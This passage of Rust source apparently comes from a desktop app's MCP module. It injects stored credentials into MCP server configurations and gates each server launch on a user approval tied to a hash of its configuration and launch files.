        McpServersConfig { mcp_servers }
    }

    /// Inject credentials from encrypted database storage
    ///
    /// Supports two types of credential placeholders:
    /// - `<from_oauth:{provider}>` - OAuth tokens (preferred, auto-refreshed)
    /// - `<from_credential_manager>` - Legacy manual credentials (fallback)
    ///
    /// OAuth tokens are checked first, with automatic fallback to legacy credentials
    /// if OAuth is not configured. Expired OAuth tokens are auto-refreshed.
    pub async fn inject_credentials(&mut self) -> crate::core::mcp::McpResult<()> {
        let db_path =
            crate::sys::utils::database_path().map_err(|e| std::io::Error::other(e.to_string()))?;

        if !db_path.exists() {
            return Ok(());
        }
        let credential_row_scope = active_credential_scope();

        // ── Sync phase ─────────────────────────────────────────────────────────
        // Collect which servers/keys need OAuth refresh vs. can be resolved now.
        // The DB connection is opened, queried, and dropped before any .await.
        //
        // `rusqlite::Connection` is !Send, it must NOT be held across an
        // await point. All synchronous DB access happens here; OAuth HTTP refresh
        // (async) is performed below after the connection is gone.

        enum Resolved {
            /// Value was resolved synchronously from DB.
            Done(String),
            /// OAuth provider token, needs async HTTP refresh check.
            NeedsOAuth(String),
        }

        enum CredentialTarget {
            Env(String),
            HttpBearerToken,
        }

        // Collect (server_name, target, resolution) triples.
        let mut plan: Vec<(String, CredentialTarget, Resolved)> = Vec::new();

        {
            // Scope: conn is dropped at the end of this block
            let conn = open_mcp_settings_db().map_err(std::io::Error::other)?;

            for (server_name, config) in &self.mcp_servers {
                for (key, value) in &config.env {
                    if value.starts_with(OAUTH_PLACEHOLDER_PREFIX) && value.ends_with('>') {
                        let provider =
                            value[OAUTH_PLACEHOLDER_PREFIX.len()..value.len() - 1].to_string();
                        plan.push((
                            server_name.clone(),
                            CredentialTarget::Env(key.clone()),
                            Resolved::NeedsOAuth(provider),
                        ));
                    } else if value.starts_with(API_KEY_PLACEHOLDER_PREFIX) && value.ends_with('>')
                    {
                        let provider =
                            value[API_KEY_PLACEHOLDER_PREFIX.len()..value.len() - 1].to_string();
                        let api_key_storage_key = format!("api_key_{}", provider);
                        match conn.query_row(
                            "SELECT value FROM settings_v2 WHERE key = ?1",
                            rusqlite::params![api_key_storage_key],
                            |row| row.get::<_, String>(0),
                        ) {
                            Ok(stored_value) => match decrypt_vault_owned_setting(&stored_value) {
                                Ok(decrypted) => {
                                    plan.push((
                                        server_name.clone(),
                                        CredentialTarget::Env(key.clone()),
                                        Resolved::Done(decrypted),
                                    ));
                                }
                                Err(e) => {
                                    tracing::warn!(
                                            "Skipping MCP server '{}': failed to decrypt credential '{}': {}",
                                            server_name,
                                            key,
                                            e
                                        );
                                    continue;
                                }
                            },
                            Err(_) => {
                                tracing::warn!("API key not found for provider: {}", provider);
                            }
                        }
                    } else if value == CREDENTIAL_PLACEHOLDER {
                        let cred_key = mcp_credential_row(&credential_row_scope, server_name, key);
                        match conn.query_row(
                            "SELECT value FROM settings_v2 WHERE key = ?1",
                            rusqlite::params![cred_key],
                            |row| row.get::<_, String>(0),
                        ) {
                            Ok(stored_value) => match decrypt_mcp_credential(&stored_value) {
                                Ok(decrypted) => {
                                    plan.push((
                                        server_name.clone(),
                                        CredentialTarget::Env(key.clone()),
                                        Resolved::Done(decrypted),
                                    ));
                                }
                                Err(e) => {
                                    tracing::warn!(
                                            "Skipping MCP server '{}': failed to decrypt credential '{}': {}",
                                            server_name,
                                            key,
                                            e
                                        );
                                    continue;
                                }
                            },
                            Err(_) => {
                                tracing::warn!(
                                    "Credential not found for {} / {}",
                                    server_name,
                                    key
                                );
                            }
                        }
                    }
                }

                if let Some(TransportConfig::Http(http_config)) = &config.transport {
                    if let Some(value) = &http_config.bearer_token {
                        if value.starts_with(OAUTH_PLACEHOLDER_PREFIX) && value.ends_with('>') {
                            let provider =
                                value[OAUTH_PLACEHOLDER_PREFIX.len()..value.len() - 1].to_string();
                            plan.push((
                                server_name.clone(),
                                CredentialTarget::HttpBearerToken,
                                Resolved::NeedsOAuth(provider),
                            ));
                        } else if value.starts_with(API_KEY_PLACEHOLDER_PREFIX)
                            && value.ends_with('>')
                        {
                            let provider = value[API_KEY_PLACEHOLDER_PREFIX.len()..value.len() - 1]
                                .to_string();
                            let api_key_storage_key = format!("api_key_{}", provider);
                            match conn.query_row(
                                "SELECT value FROM settings_v2 WHERE key = ?1",
                                rusqlite::params![api_key_storage_key],
                                |row| row.get::<_, String>(0),
                            ) {
                                Ok(stored_value) => {
                                    match decrypt_vault_owned_setting(&stored_value) {
                                        Ok(decrypted) => {
                                            plan.push((
                                                server_name.clone(),
                                                CredentialTarget::HttpBearerToken,
                                                Resolved::Done(decrypted),
                                            ));
                                        }
                                        Err(e) => {
                                            tracing::warn!(
                                            "Skipping MCP server '{}': failed to decrypt transport bearer token: {}",
                                            server_name,
                                            e
                                        );
                                        }
                                    }
                                }
                                Err(_) => {
                                    tracing::warn!(
                                        "API key not found for remote MCP server: {}",
                                        provider
                                    );
                                }
                            }
                        }
                    }
                }
            }
        } // conn dropped here, no !Send value crosses the await below

        // ── Async phase ────────────────────────────────────────────────────────
        // For each NeedsOAuth entry, call the async get_oauth_token (which may
        // make an HTTP request). All DB connections within get_oauth_token are
        // also opened and dropped before their own await points.
        for (server_name, target, resolution) in plan {
            match resolution {
                Resolved::Done(val) => {
                    if let Some(config) = self.mcp_servers.get_mut(&server_name) {
                        match target {
                            CredentialTarget::Env(key) => {
                                if let Some(entry) = config.env.get_mut(&key) {
                                    *entry = val;
                                }
                            }
                            CredentialTarget::HttpBearerToken => {
                                if let Some(TransportConfig::Http(http_config)) =
                                    &mut config.transport
                                {
                                    http_config.bearer_token = Some(val);
                                }
                            }
                        }
                    }
                }
                Resolved::NeedsOAuth(provider) => {
                    match get_oauth_token(&provider).await {
                        Ok(token) => {
                            if let Some(config) = self.mcp_servers.get_mut(&server_name) {
                                match &target {
                                    CredentialTarget::Env(key) => {
                                        if let Some(entry) = config.env.get_mut(key) {
                                            *entry = if key == "OPENAPI_MCP_HEADERS"
                                                && provider == "notion"
                                            {
                                                format!(
                                                    r#"{{"Authorization": "Bearer {}","Notion-Version": "2022-06-28"}}"#,
                                                    token
                                                )
                                            } else {
                                                token
                                            };
                                            tracing::debug!(
                                                "Injected OAuth token for provider: {}",
                                                provider
                                            );
                                        }
                                    }
                                    CredentialTarget::HttpBearerToken => {
                                        if let Some(TransportConfig::Http(http_config)) =
                                            &mut config.transport
                                        {
                                            http_config.bearer_token = Some(token);
                                            tracing::debug!(
                                                "Injected OAuth bearer token for remote MCP provider: {}",
                                                provider
                                            );
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            tracing::warn!(
                                "OAuth token not available for {} ({}), trying legacy credential",
                                provider,
                                e
                            );
                            // Fall back to legacy credential synchronously
                            let key = match &target {
                                CredentialTarget::Env(key) => key.as_str(),
                                CredentialTarget::HttpBearerToken => LEGACY_BEARER_CREDENTIAL_KEY,
                            };
                            let cred_key =
                                mcp_credential_row(&credential_row_scope, &server_name, key);
                            if let Ok(conn) = open_mcp_settings_db() {
                                if let Ok(stored_value) = conn.query_row(
                                    "SELECT value FROM settings_v2 WHERE key = ?1",
                                    rusqlite::params![cred_key],
                                    |row| row.get::<_, String>(0),
                                ) {
                                    match decrypt_mcp_credential(&stored_value) {
                                        Ok(decrypted) => {
                                            if let Some(config) =
                                                self.mcp_servers.get_mut(&server_name)
                                            {
                                                match &target {
                                                    CredentialTarget::Env(key) => {
                                                        if let Some(entry) = config.env.get_mut(key)
                                                        {
                                                            *entry = decrypted;
                                                            tracing::debug!(
                                                                "Injected legacy credential for {} / {}",
                                                                server_name,
                                                                key
                                                            );
                                                        }
                                                    }
                                                    CredentialTarget::HttpBearerToken => {
                                                        if let Some(TransportConfig::Http(
                                                            http_config,
                                                        )) = &mut config.transport
                                                        {
                                                            http_config.bearer_token =
                                                                Some(decrypted);
                                                            tracing::debug!(
                                                                "Injected legacy transport bearer credential for {}",
                                                                server_name
                                                            );
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                        Err(decrypt_err) => {
                                            tracing::warn!(
                                                "Config decryption failed for legacy credential \
                                                 {} / {}: {}, consider re-entering credentials",
                                                server_name,
                                                key,
                                                decrypt_err
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(())
    }
}

/// True when a config file holds nothing but whitespace, so a stray empty
/// `.mcp.json` does not shadow the next candidate or fail to parse.
fn is_blank_config_file(path: &std::path::Path) -> bool {
    std::fs::read_to_string(path).is_ok_and(|contents| contents.trim().is_empty())
}

const PROJECT_CONSENT_KEY_PREFIX: &str = "mcp_project_consent_";

fn sha256_hex(parts: &[&[u8]]) -> String {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    for part in parts {
        hasher.update(part);
        hasher.update([0u8]);
    }
    hex::encode(hasher.finalize())
}

fn project_consent_key(project_root: &str, server_name: &str) -> String {
    format!(
        "{PROJECT_CONSENT_KEY_PREFIX}{}",
        sha256_hex(&[project_root.as_bytes(), server_name.as_bytes()])
    )
}

/// What the user agreed to run, as [`project_server_fingerprint`] hashes it:
/// the launch, never its on/off flag. Header values and secret environment
/// values ([`agiworkforce_sandbox_policy::value_is_secret`]) are left out,
/// since they hold credentials and rotating one is not a different server;
/// every other environment value is pinned, since any of them can decide
/// what code runs. A `<from_…>` reference is pinned wherever it stands: it
/// holds no secret, and it names which stored credential the server is
/// handed. Every map is sorted, so the same launch always hashes the
/// same. The folder it runs in is part of the consent key. `files` is the
/// content of each file the launch runs code from that a sandboxed command
/// could have written, see [`project_launch_pins`]; a launch with none
/// hashes exactly as it did before files were pinned.
#[derive(serde::Serialize)]
#[serde(tag = "transport", rename_all = "lowercase")]
enum ProjectLaunch<'a> {
    Stdio {
        command: &'a str,
        args: &'a [String],
        env_keys: Vec<&'a str>,
        pinned_env: std::collections::BTreeMap<&'a str, std::borrow::Cow<'a, str>>,
        allow_local_network: bool,
        #[serde(skip_serializing_if = "pins_no_file")]
        files: &'a std::collections::BTreeMap<String, String>,
    },
    Http {
        url: &'a str,
        header_keys: Vec<&'a str>,
        api_key: bool,
        bearer_token: bool,
        #[serde(skip_serializing_if = "Option::is_none")]
        bearer_token_reference: Option<&'a str>,
        verify_ssl: bool,
        allow_local_network: bool,
        #[serde(skip_serializing_if = "Option::is_none")]
        oauth_client_id: Option<&'a str>,
        #[serde(skip_serializing_if = "std::ops::Not::not")]
        oauth_client_secret: bool,
        #[serde(skip_serializing_if = "Option::is_none")]
        oauth_token_url: Option<&'a str>,
    },
}

fn pins_no_file(files: &&std::collections::BTreeMap<String, String>) -> bool {
    files.is_empty()
}

fn sorted_keys(map: &HashMap<String, String>) -> Vec<&str> {
    let mut keys: Vec<&str> = map.keys().map(String::as_str).collect();
    keys.sort_unstable();
    keys
}

/// The hash of a server's [`ProjectLaunch`]. A changed command, argument,
/// environment name, environment value that is not a secret, URL, header
/// name, OAuth client, token endpoint or transport
/// needs consent again, and so does letting it reach services on this
/// computer.
fn project_server_fingerprint(server: &McpServerConfig) -> String {
    launch_fingerprint_with_files(server, &std::collections::BTreeMap::new())
}

/// The pin of each file a project server's launch runs code from that a
/// sandboxed command could have written, by the label shown to the user:
/// the shared step, with this app's `package.json` reader. A remote server
/// runs no local file. A relative name is read from the project, where a
/// sandboxed server starts; what those files import is not followed. A file
/// the step could not pin, too large, past its count, not a regular file or
/// changed under the read, carries its marker in place of a digest.
fn project_launch_pins(
    project_root: &str,
    server: &McpServerConfig,
    digest: &dyn Fn(&[u8]) -> String,
) -> std::collections::BTreeMap<String, String> {
    if matches!(server.transport, Some(TransportConfig::Http(_))) {
        return std::collections::BTreeMap::new();
    }
    agiworkforce_sandbox_policy::launch_files::pinned_launch_file_digests(
        std::path::Path::new(project_root),
        true,
        &server.command,
        &server.args,
        &crate::core::mcp::sandbox::package_entries,
        digest,
    )
}

/// The first file among the pins that could not be pinned, and why. One is
/// enough: an edit to it could not be noticed, so nothing recorded for this
/// launch can stand, and it is approved one start at a time.
fn unpinnable_launch_file(pins: &std::collections::BTreeMap<String, String>) -> Option<String> {
    pins.iter().find_map(|(label, pinned)| {
        let reason = agiworkforce_sandbox_policy::launch_files::unpinnable_reason(pinned)?;
        Some(format!("{label} cannot be pinned, because {reason}"))
    })
}

/// The labels of the files an approval pins, or why it pins none.
pub type ApprovalCoverage = Result<Vec<String>, String>;

/// What an approval of this launch covers, found by reading its files: the
/// labels of the files it pins, or which file cannot be pinned and why.
fn read_approval_coverage(project_root: &str, listed: &McpServerConfig) -> ApprovalCoverage {
    let pins = project_launch_pins(project_root, listed, &|_| String::new());
    match unpinnable_launch_file(&pins) {
        Some(why) => Err(format!(
            "This server is approved one start at a time: {why}."
        )),
        None => Ok(pins.into_keys().collect()),
    }
}

/// What a file's metadata says about it, without opening it: whether it is
/// there, a regular file, a link, its size and when it last changed.
#[derive(Debug, Clone, PartialEq, Eq)]
struct FileStamp(Option<(bool, bool, u64, Option<SystemTime>)>);

fn file_stamp(path: &std::path::Path) -> FileStamp {
    let is_link = std::fs::symlink_metadata(path).is_ok_and(|found| found.is_symlink());
    FileStamp(
        std::fs::metadata(path)
            .ok()
            .map(|found| (found.is_file(), is_link, found.len(), found.modified().ok())),
    )
}

/// Every path whose change could change what [`read_approval_coverage`]
/// finds: the files the launch may run code from, there or not, and each
/// thing the command line names, read from the project. A folder is here
/// too, and its stamp changes when something is added to it.
fn coverage_watch_list(project_root: &str, listed: &McpServerConfig) -> Vec<PathBuf> {
    let project = std::path::Path::new(project_root);
    agiworkforce_sandbox_policy::launch_files::pinnable_launch_files(
        Some(project),
        &listed.command,
        &listed.args,
        &crate::core::mcp::sandbox::package_entries,
    )
    .into_iter()
    .map(|(_, path)| path)
    .chain(
        std::iter::once(&listed.command)
            .chain(&listed.args)
            .map(|named| project.join(named)),
    )
    .collect()
}

const MAX_REMEMBERED_COVERAGES: usize = 64;

struct RememberedCoverage {
    stamps: Vec<(PathBuf, FileStamp)>,
    coverage: ApprovalCoverage,
}

/// What the server list last found each project server's approval to
/// cover, so that listing the servers again does not read their files
/// again. It is for the list only: an approval, a start and a restart never
/// look here, they read the files. An entry is used only while every path
/// it watched has the stamp it had; anything else reads afresh. It holds one
/// project's servers at a time and no more than
/// [`MAX_REMEMBERED_COVERAGES`].
#[derive(Default)]
struct ListedCoverages {
    project_root: String,
    remembered: HashMap<(String, String), RememberedCoverage>,
}

impl ListedCoverages {
    fn coverage(
        &mut self,
        project_root: &str,
        server_name: &str,
        listed: &McpServerConfig,
        read: impl FnOnce() -> ApprovalCoverage,
    ) -> ApprovalCoverage {
        if self.project_root != project_root {
            self.remembered.clear();
            self.project_root = project_root.to_string();
        }
        let key = (server_name.to_string(), project_server_fingerprint(listed));
        if let Some(known) = self.remembered.get(&key) {
            let unchanged = known
                .stamps
                .iter()
                .all(|(path, stamp)| file_stamp(path) == *stamp);
            if unchanged {
                return known.coverage.clone();
            }
        }

        let stamps: Vec<(PathBuf, FileStamp)> = coverage_watch_list(project_root, listed)
            .into_iter()
            .map(|path| {
                let stamp = file_stamp(&path);
                (path, stamp)
            })
            .collect();
        let coverage = read();
        if self.remembered.len() >= MAX_REMEMBERED_COVERAGES && !self.remembered.contains_key(&key)
        {
            self.remembered.clear();
        }
        self.remembered.insert(
            key,
            RememberedCoverage {
                stamps,
                coverage: coverage.clone(),
            },
        );
        coverage
    }
}

static LISTED_COVERAGES: std::sync::Mutex<Option<ListedCoverages>> = std::sync::Mutex::new(None);

/// What the approval surface says an approval of this server covers: the
/// labels of the files it pins, or which file cannot be pinned and why, so
/// that the server is asked about at each start. `None` for a server the
/// project's MCP file does not list, which no project approval applies to.
/// This is what the server list shows, and it reads a launch file only when
/// that file, or what the launch names, has changed since it last looked.
pub fn project_approval_coverage(
    project_root: &str,
    server_name: &str,
) -> Option<ApprovalCoverage> {
    let listed = project_server_entry(project_root, server_name)?;
    let read = || read_approval_coverage(project_root, &listed);
    let mut coverages = match LISTED_COVERAGES.lock() {
        Ok(coverages) => coverages,
        Err(_) => return Some(read()),
    };
    Some(
        coverages
            .get_or_insert_with(ListedCoverages::default)
            .coverage(project_root, server_name, &listed, read),
    )
}

/// The launch and the content of the files it runs, as one hash: what a
/// project approval is recorded against. `Err` when one of those files could
/// not be pinned, and then nothing recorded can match.
fn pinned_project_fingerprint(
    project_root: &str,
    server: &McpServerConfig,
) -> Result<String, String> {
    let pins = project_launch_pins(project_root, server, &|content| sha256_hex(&[content]));
    match unpinnable_launch_file(&pins) {
        Some(why) => Err(why),
        None => Ok(launch_fingerprint_with_files(server, &pins)),
    }
}

fn launch_fingerprint_with_files(
    server: &McpServerConfig,
    files: &std::collections::BTreeMap<String, String>,
) -> String {
    let launch = match &server.transport {
        Some(TransportConfig::Http(http)) => ProjectLaunch::Http {
            url: &http.url,
            header_keys: sorted_keys(&http.headers),
            api_key: http.api_key.is_some(),
            bearer_token: http.bearer_token.is_some(),
            bearer_token_reference: http
                .bearer_token
                .as_deref()
                .filter(|value| is_credential_reference(value)),
            verify_ssl: http.verify_ssl,
            allow_local_network: server.allow_local_network,
            oauth_client_id: http.oauth_client_id.as_deref(),
            oauth_client_secret: http.oauth_client_secret.is_some(),
            oauth_token_url: http.oauth_token_url.as_deref(),
        },
        Some(TransportConfig::Stdio) | None => ProjectLaunch::Stdio {
            command: &server.command,
            args: &server.args,
            env_keys: sorted_keys(&server.env),
            pinned_env: server
                .env
                .iter()
                .filter_map(|(name, value)| {
                    let pinned = if is_credential_reference(value) {
                        std::borrow::Cow::Borrowed(value.as_str())
                    } else {
                        agiworkforce_sandbox_policy::pinned_value(name, value, |hidden| {
                            sha256_hex(&[hidden.as_bytes()])
                        })?
                    };
                    Some((name.as_str(), pinned))
                })
                .collect(),
            allow_local_network: server.allow_local_network,
            files,
        },
    };
    sha256_hex(&[serde_json::to_string(&launch)
        .unwrap_or_default()
        .as_bytes()])
}

/// The entry a project's MCP file holds for a server right now, read the way
/// the consent check reads it. `None` when the file or the entry is gone.
fn project_server_entry(project_root: &str, server_name: &str) -> Option<McpServerConfig> {
    let path = McpServersConfig::resolve_project_config_path(project_root);
    let contents = std::fs::read_to_string(path).ok()?;
    let mut config = McpServersConfig::from_json(&contents).ok()?;
    config.mcp_servers.remove(server_name)
}

/// Whose a server is, which decides where its approval is kept and where a
/// relative name in its launch is read from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum LaunchScope {
    /// Listed by the open project's MCP file. The approval is for this
    /// project only, and names are read from its folder.
    Project(String),
    /// The user's own: from the app's settings, the dotfile, an extension or
    /// a connector.
    User,
}

const USER_SCOPE: &str = "user";
const APPROVE_AGAIN: &str =
    "It stays stopped until you connect it again in Settings, MCP, and approve it as it is now.";

impl LaunchScope {
    fn within(active_project: Option<&str>, server_name: &str) -> Self {
        match active_project {
            Some(root) if project_server_entry(root, server_name).is_some() => {
                Self::Project(root.to_string())
            }
            _ => Self::User,
        }
    }

    fn approval_key(&self, server_name: &str) -> String {
        let root = match self {
            Self::Project(root) => root.as_str(),
            Self::User => USER_SCOPE,
        };
        project_consent_key(root, server_name)
    }

    fn files_root<'a>(&'a self, user_files_root: &'a str) -> &'a str {
        match self {
            Self::Project(root) => root,
            Self::User => user_files_root,
        }
    }
}

/// Whether a launch has the user's approval as it is now.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum LaunchApproval {
    /// The approval on record is for exactly this launch and these files.
    Approved,
    /// Nothing on record matches: it is new, or it or a file it runs changed.
    NotApproved,
    /// A file it runs cannot be pinned, so no record can cover it and it is
    /// asked about at every start. The text names the file and why.
    OneStartAtATime(String),
}

/// What [`launch_standing`] found: whose the server is, the fingerprint of
/// its launch as it is now when it has one, and whether that is approved.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LaunchStanding {
    pub scope: LaunchScope,
    pub approval: LaunchApproval,
    fingerprint: Option<String>,
}

impl LaunchStanding {
    /// Whether this is the launch another standing was taken of: the same
    /// scope and the same configuration and files. Used after the user has
    /// answered, to refuse a yes given to something that has since changed.
    pub(super) fn is_the_launch_shown_as(&self, shown: &LaunchStanding) -> bool {
        self.scope == shown.scope && self.fingerprint == shown.fingerprint
    }

    #[cfg(test)]
    pub(super) fn for_prompt_tests(scope: LaunchScope, approval: LaunchApproval) -> Self {
        Self {
            scope,
            approval,
            fingerprint: None,
        }
    }
}

/// The one decision every start of a server goes through: at load, at
/// connect, at a restart by the app and at a respawn by the engine.
///
/// `Err` is a launch that may not start whatever the user answers now: it is
/// switched off, or the project's MCP file no longer says what was loaded
/// from it. Otherwise the standing says whether it is approved as it is now,
/// with the files it runs read afresh.
///
/// `server` is the entry as configured, before credentials are resolved
/// into it, because that is what an approval is recorded against.
fn launch_standing_with(
    active_project: Option<&str>,
    user_files_root: &str,
    server_name: &str,
    server: &McpServerConfig,
    is_recorded: &dyn Fn(&LaunchScope, &str) -> bool,
) -> Result<LaunchStanding, String> {
    if !server.enabled {
        return Err("it is switched off.".to_string());
    }
    let scope = LaunchScope::within(active_project, server_name);
    if let LaunchScope::Project(root) = &scope {
        let Some(listed) = project_server_entry(root, server_name) else {
            return Err(
                "this project's MCP file no longer lists it, so it stays stopped.".to_string(),
            );
        };
        if project_server_fingerprint(&listed) != project_server_fingerprint(server) {
            return Err(format!(
                "its configuration in this project's MCP file changed after you approved it. {APPROVE_AGAIN}"
            ));
        }
        if !listed.enabled {
            return Err(
                "this project's MCP file now has it switched off, so it stays stopped.".to_string(),
            );
        }
    }
    let (approval, fingerprint) =
        match pinned_project_fingerprint(scope.files_root(user_files_root), server) {
            Err(why) => (LaunchApproval::OneStartAtATime(why), None),
            Ok(fingerprint) if is_recorded(&scope, &fingerprint) => {
                (LaunchApproval::Approved, Some(fingerprint))
            }
            Ok(fingerprint) => (LaunchApproval::NotApproved, Some(fingerprint)),
        };
    Ok(LaunchStanding {
        scope,
        approval,
        fingerprint,
    })
}

fn approval_on_record(scope: &LaunchScope, server_name: &str) -> Option<String> {
    let conn = open_mcp_settings_db().ok()?;
    conn.query_row(
        "SELECT value FROM settings_v2 WHERE key = ?1",
        rusqlite::params![scope.approval_key(server_name)],
        |row| row.get::<_, String>(0),
    )
    .ok()
}

/// Where a relative name in a user-scoped launch is read from: the folder
/// such a server starts in.
fn user_files_root() -> String {
    crate::core::mcp::sandbox::mcp_workspace()
        .map(|workspace| workspace.to_string_lossy().into_owned())
        .unwrap_or_default()
}

/// Where a launch of this scope starts and reads relative names from.
pub(super) fn launch_files_root(scope: &LaunchScope) -> String {
    scope.files_root(&user_files_root()).to_string()
}

/// The labels of the files an approval of this launch covers, for showing.
pub(super) fn pinned_file_labels(scope: &LaunchScope, server: &McpServerConfig) -> Vec<String> {
    project_launch_pins(&launch_files_root(scope), server, &|_| String::new())
        .into_keys()
        .collect()
}

/// [`launch_standing_with`] against the open project and the approvals on
/// record.
pub fn launch_standing(
    server_name: &str,
    server: &McpServerConfig,
) -> Result<LaunchStanding, String> {
    launch_standing_with(
        McpServersConfig::active_project_folder_from_env().as_deref(),
        &user_files_root(),
        server_name,
        server,
        &|scope, fingerprint| {
            approval_on_record(scope, server_name).as_deref() == Some(fingerprint)
        },
    )
}

/// Records the user's yes to this launch as it is now. A launch that can be
/// approved only one start at a time records nothing.
pub fn record_launch_approval(server_name: &str, standing: &LaunchStanding) -> Result<(), String> {
    let Some(fingerprint) = &standing.fingerprint else {
        return Ok(());
    };
    let conn = open_mcp_settings_db()?;
    upsert_settings_v2_value(
        &conn,
        &standing.scope.approval_key(server_name),
        fingerprint,
        "security",
        false,
    )
}

/// Forgets the approval of a server, as when the user switches it off.
pub fn withdraw_launch_approval(server_name: &str) -> Result<(), String> {
    let scope = LaunchScope::within(
        McpServersConfig::active_project_folder_from_env().as_deref(),
        server_name,
    );
    let conn = open_mcp_settings_db()?;
    conn.execute(
        "DELETE FROM settings_v2 WHERE key = ?1",
        rusqlite::params![scope.approval_key(server_name)],
    )
    .map(|_| ())
    .map_err(|e| format!("Failed to clear the MCP approval: {e}"))
}

/// Proof that a server's launch went through [`launch_standing`] and was
/// approved, by a record or by a yes given just now. Starting a server takes
/// one, so no path can start one without it, and it carries what the engine
/// needs to ask the same question again before it respawns the server.
pub struct ApprovedLaunch(Option<StartedLaunch>);

#[derive(Clone)]
struct StartedLaunch {
    server_name: String,
    server: McpServerConfig,
    scope: LaunchScope,
    fingerprint: Option<String>,
}

impl ApprovedLaunch {
    /// For a start nobody is asked about. `Err` unless the launch is
    /// approved as it is now; the text says why and what to do.
    pub fn require(server_name: &str, server: &McpServerConfig) -> Result<Self, String> {
        let standing = launch_standing(server_name, server)
            .map_err(|why| format!("MCP server '{server_name}' was not started: {why}"))?;
        match &standing.approval {
            LaunchApproval::Approved => Ok(Self::of(server_name, server, &standing)),
            LaunchApproval::NotApproved => Err(format!(
                "MCP server '{server_name}' was not started: it is not approved as it is now. {APPROVE_AGAIN}"
            )),
            LaunchApproval::OneStartAtATime(why) => Err(format!(
                "MCP server '{server_name}' was not started: it is approved one start at a time: {why}. {APPROVE_AGAIN}"
            )),
        }
    }

    /// For a start the user has just said yes to in the native dialog,
    /// which is what makes a launch that cannot be pinned startable at all.
    pub(super) fn of(
        server_name: &str,
        server: &McpServerConfig,
        standing: &LaunchStanding,
    ) -> Self {
        Self(Some(StartedLaunch {
            server_name: server_name.to_string(),
            server: server.clone(),
            scope: standing.scope.clone(),
            fingerprint: standing.fingerprint.clone(),
        }))
    }

    /// For a server that is running, and so was approved, which the app is
    /// restarting with folders the user granted it elsewhere: the filesystem
    /// server and its roots. `running` is the launch it was approved and
    /// started as, `next` the one to start now, and `apart_from_roots` what
    /// is left of a launch once its folders are taken out. The start is
    /// refused unless the two are then the same: a configuration changed
    /// behind a running server is never started, or recorded as approved,
    /// on the strength of a yes that did not see it. The new launch is
    /// recorded where its standing allows, so connecting it later does not
    /// ask about a change the app made itself; where it does not, this start
    /// stands alone and the engine will not respawn it.
    pub fn continuing(
        server_name: &str,
        running: Option<&McpServerConfig>,
        next: &McpServerConfig,
        apart_from_roots: &dyn Fn(&McpServerConfig) -> McpServerConfig,
    ) -> Result<Self, String> {
        let unchanged = running.is_some_and(|running| {
            same_launch(&apart_from_roots(running), &apart_from_roots(next))
        });
        if !unchanged {
            return Err(format!(
                "MCP server '{server_name}' was stopped: its configuration is not the one it was started with, so it was not restarted with the new folders. {APPROVE_AGAIN}"
            ));
        }
        let standing = launch_standing(server_name, next)
            .map_err(|why| format!("MCP server '{server_name}' was not restarted: {why}"))?;
        if standing.approval == LaunchApproval::NotApproved {
            if let Err(error) = record_launch_approval(server_name, &standing) {
                tracing::warn!(
                    "[MCP] the approval of '{}' could not be carried over: {}",
                    server_name,
                    error
                );
            }
        }
        Ok(Self::of(server_name, next, &standing))
    }

    /// The server this launch was approved as, its credential references
    /// unresolved; `None` only for a launch assumed in a test.
    pub(super) fn server(&self) -> Option<&McpServerConfig> {
        self.0.as_ref().map(|started| &started.server)
    }

    /// For tests that start a server no user was ever asked about. It does
    /// not exist in a release build, so nothing shipped can call it.
    #[cfg(debug_assertions)]
    pub fn assumed_in_tests() -> Self {
        Self(None)
    }

    /// What the engine asks before it respawns this server; `None` only for
    /// a launch assumed in a test.
    pub(super) fn respawn_check(
        &self,
    ) -> Option<Arc<dyn Fn() -> Result<(), String> + Send + Sync>> {
        let started = self.0.clone()?;
        Some(Arc::new(move || {
            started.still_allowed(launch_standing(&started.server_name, &started.server))
        }))
    }
}

/// Whether two launches are the same in every field.
fn same_launch(one: &McpServerConfig, other: &McpServerConfig) -> bool {
    match (serde_json::to_value(one), serde_json::to_value(other)) {
        (Ok(one), Ok(other)) => one == other,
        _ => false,
    }
}

impl StartedLaunch {
    /// Whether the launch the engine saved may be started again, given its
    /// standing now. A stopped server is restarted from what was saved when
    /// it first started, and since then the project's MCP file, the files
    /// the launch runs and the approval itself can each have changed.
    fn still_allowed(&self, now: Result<LaunchStanding, String>) -> Result<(), String> {
        let now = now?;
        if now.scope != self.scope {
            return Err(match &self.scope {
                LaunchScope::Project(_) => {
                    "this project's MCP file no longer lists it, so it stays stopped.".to_string()
                }
                LaunchScope::User => {
                    "the project now open lists a server of this name, so this one stays stopped."
                        .to_string()
                }
            });
        }
        match now.approval {
            LaunchApproval::Approved => Ok(()),
            LaunchApproval::OneStartAtATime(why) => Err(format!(
                "it is approved one start at a time: {why}. {APPROVE_AGAIN}"
            )),
            LaunchApproval::NotApproved if self.fingerprint.is_none() => Err(format!(
                "it was approved for one start only. {APPROVE_AGAIN}"
            )),
            LaunchApproval::NotApproved if now.fingerprint != self.fingerprint => Err(format!(
                "a file it runs changed after you approved it. {APPROVE_AGAIN}"
            )),
            LaunchApproval::NotApproved => {
                Err(format!("it is no longer approved. {APPROVE_AGAIN}"))
            }
        }
    }
}

pub fn open_mcp_settings_db() -> Result<rusqlite::Connection, String> {
    crate::data::db::key_management::open_registered_main_database_connection()
}

pub fn upsert_settings_v2_value(
    conn: &rusqlite::Connection,
    key: &str,
    value: &str,
    category: &str,
    encrypted: bool,
) -> Result<(), String> {
    let now = chrono::Utc::now().to_rfc3339();
    conn.execute(
        "INSERT INTO settings_v2 (key, value, category, encrypted, created_at, updated_at)
         VALUES (?1, ?2, ?3, ?4, ?5, ?5)
         ON CONFLICT(key) DO UPDATE SET
           value = excluded.value,
           category = excluded.category,
           encrypted = excluded.encrypted,
           updated_at = excluded.updated_at",
        rusqlite::params![key, value, category, encrypted as i32, now],
    )
    .map_err(|e| format!("Failed to upsert settings_v2 key '{}': {}", key, e))?;

    Ok(())
}

/// Synchronous helper: read all OAuth token fields from the DB and return owned values.
/// The connection is opened and closed within this fn, no `conn` is held across await points.
struct OAuthTokenData {
    encrypted_access: String,
    expires_at: Option<i64>,
    refresh_token: Option<String>, // already decrypted
}

